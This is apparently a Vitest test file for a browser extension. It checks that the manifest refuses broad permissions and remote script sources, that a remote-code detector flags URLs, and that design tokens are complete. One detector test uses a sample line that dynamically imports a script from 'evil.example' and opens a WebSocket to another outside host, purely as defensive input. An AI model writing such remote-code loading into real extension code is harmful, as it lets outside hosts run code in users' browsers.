import fs from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { EXTENSION_VERSION } from "../src/version.ts";
import { HOSTED_SERVER } from "../src/shared/config.ts";
import { HOSTED_ORIGIN, checkManifest, remoteUrls } from "./check.mjs";
import { tokensCss } from "./tokens.mjs";

const root = path.resolve(import.meta.dirname, "..");
const read = (file: string): string =>
  fs.readFileSync(path.join(root, file), "utf8");
const manifest = JSON.parse(read("static/manifest.json")) as Record<
  string,
  unknown
>;
const pkg = JSON.parse(read("package.json")) as { version: string };

describe("manifest", () => {
  it("passes the build check", () => {
    expect(checkManifest(manifest, pkg.version)).toEqual([]);
  });

  it("agrees with the code on version and hosted server", () => {
    expect(pkg.version).toBe(EXTENSION_VERSION);
    expect(HOSTED_SERVER).toBe(HOSTED_ORIGIN);
  });

  it("refuses extra permissions, broad hosts, content scripts and remote CSP sources", () => {
    const changed = (patch: Record<string, unknown>) =>
      checkManifest({ ...manifest, ...patch }, pkg.version);
    expect(
      changed({
        permissions: [
          "storage",
          "alarms",
          "idle",
          "offscreen",
          "clipboardWrite",
          "tabs",
        ],
      }),
    ).not.toEqual([]);
    expect(changed({ host_permissions: ["<all_urls>"] })).not.toEqual([]);
    expect(changed({ content_scripts: [] })).not.toEqual([]);
    expect(changed({ web_accessible_resources: [] })).not.toEqual([]);
    expect(
      changed({
        content_security_policy: {
          extension_pages:
            "script-src 'self' 'wasm-unsafe-eval' https://cdn.example; object-src 'self'",
        },
      }),
    ).not.toEqual([]);
    expect(changed({ version: "9.9.9" })).not.toEqual([]);
  });
});

describe("remote code check", () => {
  it("allows the hosted server, local servers and XML namespaces", () => {
    expect(
      remoteUrls(
        'a="https://api.pwm.invalid/v1";b="http://localhost:8080";c="http://www.w3.org/2000/svg"',
      ),
    ).toEqual([]);
  });

  it("finds any other URL", () => {
    expect(
      remoteUrls(
        'import("https://evil.example/x.js");fetch(`wss://t.example`)',
      ),
    ).toEqual(["https://evil.example/x.js", "wss://t.example"]);
  });
});

describe("design tokens", () => {
  const css = tokensCss(
    JSON.parse(
      fs.readFileSync(path.join(root, "..", "design", "tokens.json"), "utf8"),
    ) as Record<string, unknown>,
  );

  it("defines every variable the popup uses", () => {
    const defined = new Set([...css.matchAll(/(--[\w-]+):/g)].map((m) => m[1]));
    const used = new Set(
      [...read("static/popup.css").matchAll(/var\((--[\w-]+)\)/g)].map(
        (m) => m[1],
      ),
    );
    expect([...used].filter((name) => !defined.has(name))).toEqual([]);
  });

  it("has a dark theme for every light color", () => {
    const light = css.split("@media")[0] ?? "";
    const dark = css.split("@media")[1] ?? "";
    const colors = (text: string) =>
      [...text.matchAll(/(--color-[\w-]+):/g)].map((m) => m[1]).sort();
    expect(colors(dark)).toEqual(colors(light));
  });
});
